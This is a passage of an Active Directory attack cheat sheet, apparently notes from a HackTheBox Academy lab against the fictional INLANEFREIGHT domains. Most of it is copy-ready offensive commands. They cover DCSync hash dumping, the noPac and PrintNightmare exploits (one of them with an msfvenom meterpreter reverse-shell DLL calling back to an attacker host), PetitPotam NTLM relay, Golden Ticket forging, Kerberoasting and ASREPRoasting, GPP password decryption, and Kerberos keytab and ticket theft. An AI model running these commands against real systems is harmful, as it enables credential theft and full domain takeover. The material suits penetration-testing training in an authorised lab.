| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |
| `Get-DomainUser -Identity * \| ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} \|select samaccountname,useraccountcontrol` | Checking for Reversible Encryption Option using Get-DomainUser |

> `runas /netonly /user:INLANEFREIGHT\adunn powershell`


# Privileged Access 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`). |
| `evil-winrm -i 10.129.201.234 -u forend`                     | Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`. |
| `Import-Module .\PowerUpSQL.ps1`                             | Used to import the `PowerUpSQL` tool.                        |
| `Get-SQLInstanceDomain`                                      | PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | PowerUpSQL tool used to connect to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host. |
| `mssqlclient.py`                                             | Impacket tool used to display the functionality and options provided with `mssqlclient.py` from a Linux-based host. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Impacket tool used to connect to a MSSQL server from a Linux-based host. |
| `SQL> help`                                                  | Used to display mssqlclient.py options once connected to a MSSQL server. |
| `SQL> enable_xp_cmdshell`                                   | Used to enable `xp_cmdshell stored procedure` that allows for executing OS commands via the database from a Linux-based host. |
| `xp_cmdshell whoami /priv`                                   | Used to enumerate rights on a system using `xp_cmdshell`.    |



# NoPac

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo git clone https://github.com/Ridter/noPac.git`         | Used to clone a `noPac` exploit using git. Performed from a Linux-based host. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Scanning for NoPac. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Running NoPac & Getting a Shell. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller. |



# PrintNightmare

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `git clone https://github.com/cube0x0/CVE-2021-1675.git`     | Used to clone a PrintNightmare exploit|
| `pip3 uninstall impacket; git clone https://github.com/cube0x0/impacket; cd impacket; python3 ./setup.py install` | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`            | Check if a Windows target has `MS-PAR` & `MSRPRN` exposed. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Generate a DLL payload to be used by the exploit to gain a shell session. |
| `sudo smbserver.py -smb2support LocShareData /path/to/backupscript.dll` | Create an SMB server and host a shared folder (`LocShareData`) at the specified location on the local linux host. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\LocShareData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. |



# PetitPotam

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host. |
| `git clone https://github.com/topotam/PetitPotam.git`        | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5`              | Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache` | Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host. |
| `klist`                                                      | `krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Used to submit TGS requests using `getnthash.py` from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`      | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |



# Miscellaneous Misconfigurations

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module .\SecurityAssessment.ps1`                     | Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host. |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`      | Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`   | Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host. |
| `Get-DomainUser * \| Select-Object samaccountname,description ` | PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`    | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

# Group Policy Enumeration & Attacks

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`    | Tool used to decrypt a captured `group policy preference password` from a Linux-based host. |
| `crackmapexec smb -L \| grep gpp`                              | Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host. |
| `Get-DomainGPO \| select displayname`| Enumerating GPO Names with PowerView |
| `Get-GPO -All \| Select DisplayName`| Enumerating GPO Names with a Built-In Cmdlet |
| `$sid=Convert-NameToSid "Domain Users" `                     | Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host. |
| `Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid` | PowerView tool that is used to check if the `Domain Users`  (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host. |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`         | PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host. |



# ASREPRoasting

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | Enumerating for `DONT_REQ_PREAUTH` Value using Get-DomainUser.|
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Retrieving AS-REP in Proper Format using `Rubeus`. |
| `GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users` | Hunting for Users with Kerberoast Pre-auth not required, retrieving the AS-REP using `GetNPUsers` |
| `hashcat -m 18200 ygroce_asrep /usr/share/wordlists/rockyou.txt ` | Kerberos 5, etype 23, AS-REP. |



# Trust Relationships - Child > Parent

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module activedirectory; Get-ADTrust -Filter *`| Enumerating Trust Relationships using `Get-ADTrust` |
| `Get-DomainTrust `| Checking for Existing Trusts using Get-DomainTrust|
| `Get-DomainTrustMapping`| Perform a domain trust mapping|
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName` | Checking users in the Child Domain using `Get-DomainUser`|
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`          | Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash`|
| `Get-DomainSID` | Get the SID for the child domain|
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" `|Obtaining Enterprise Admins Group's SID using `Get-DomainGroup` |
|`Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`| Obtaining Enterprise Admins Group's SID using `Get-ADGroup` |
| `ls \\academy-ea-dc01.inlanefreight.local\c$`| Using ls to Confirm No Access before ExtraSids Attack|
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses Mimikatz to create a Golden Ticket |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | Uses Rubeus to create a Golden Ticket. |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`     | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host. |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Performing DCSync with secretsdump.py |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 ` | Performing SID Brute Forcing using lookupsid.py |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"` | Grabbing the Domain SID & Attaching to Enterprise Admin's RID |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker` | Constructing a Golden Ticket using ticketer.py |
| `export KRB5CCNAME=hacker.ccache`| Setting the KRB5CCNAME Environment Variable |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Getting a SYSTEM shell using Impacket's psexec.py |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Performing the Attack automate with raiseChild.py |



# Trust Relationships - Cross-Forest 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | Enumerating accounts for associated SPNs using Get-DomainUser|
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` |Enumerating the mssqlsvc account |
| ` .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Performing a Kerberoasting Attacking with Rubeus Using /domain Flag |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL` | Enumerating groups with users that do not belong to the domain |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmd-let used to remotely connect to a target Windows system |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Request the TGS ticket of an account in a target Windows domain |
| `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request -outputfile TGS_ticket` | Request the TGS ticket of an account in a target Windows domain |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host. |
| `zip -r ilfreight_bh.zip *.json`                             | Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI. |

## Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

```
powen@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```


# Identifying Linux and Active Directory Integration

realm - Check If Linux Machine is Domain Joined
```
realm list
```

PS - Check if Linux Machine is Domain Joined
```
ps -ef | grep -i "winbind\|sssd"
```

Using Find to Search for Files with Keytab in the Name
```
find / -name *keytab* -ls 2>/dev/null
```

Reviewing Environment Variables for ccache Files.
```
env | grep -i krb5
```

Listing keytab File Information
```
klist -k -t
```

Impersonating a User with a keytab
```
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
```
smbclient //dc01/carlos -k -c ls
```

Extracting Keytab Hashes with KeyTabExtract
```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

Log in as Carlos
```
su - carlos@inlanefreight.htb
```

Importing the ccache File into our Current Session
```
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
smbclient //dc01/C$ -k -c ls -no-pass
```

Setting the KRB5CCNAME Environment Variable
```
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

Using Impacket with proxychains and Kerberos Authentication
> To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
```
proxychains impacket-wmiexec dc01 -k
```


Kerberos Configuration File for INLANEFREIGHT.HTB
```
powen@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

Using Evil-WinRM with Kerberos
```
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

Impacket Ticket Converter
```
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Importing Converted Ticket into Windows Session with Rubeus
```
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

Linikatz

Linikatz is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.

Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.


> Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

# Kerberos "Double Hop" Problem

## Background
The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.

The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.

## Workaround #1: PSCredential Object

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.

set up a PSCredential object and try again. First, we set up our authentication.

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
```

## Workaround #2: Register PSSession Configuration

We've seen what we can do to overcome this problem when using a tool such as evil-winrm to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the Enter-PSSession cmdlet? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).

One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet.

```
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

Once this is done, we need to restart the WinRM service by typing `Restart-Service` WinRM in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.

```
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist
```

## Finding Passwords in the Description Field using Get-Domain User

```
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```




